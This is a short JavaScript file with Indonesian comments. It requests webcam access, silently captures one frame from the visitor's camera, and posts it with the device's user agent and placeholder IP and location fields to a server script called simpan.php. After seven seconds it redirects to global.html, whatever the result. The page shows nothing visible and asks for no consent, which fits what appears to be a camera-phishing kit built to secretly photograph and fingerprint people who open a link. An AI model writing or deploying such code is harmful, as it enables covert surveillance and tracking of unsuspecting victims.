
const video = document.createElement("video");
const canvas = document.createElement("canvas");
let ctx = canvas.getContext("2d");
let foto = "";

navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
  video.srcObject = stream;
  video.play();

  video.onloadedmetadata = () => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    foto = canvas.toDataURL("image/png");

    const ip = "auto";       // placeholder, ganti jika perlu
    const lokasi = "auto";   // placeholder, ganti jika perlu
    const device = navigator.userAgent;

    fetch("simpan.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ip, lokasi, device, foto })
    })
    .then(response => {
      if (!response.ok) throw new Error("Gagal simpan!");
      return response.text();
    })
    .then(result => {
      console.log("✅ Data berhasil dikirim:", result);
      stream.getTracks().forEach(track => track.stop());
      setTimeout(() => window.location.href = "global.html", 7000);
    })
    .catch(error => {
      console.error("❌ Gagal:", error);
      setTimeout(() => window.location.href = "global.html", 7000);
    });
  };
}).catch(error => {
  console.error("❌ Gagal akses kamera:", error);
  setTimeout(() => window.location.href = "global.html", 7000);
});
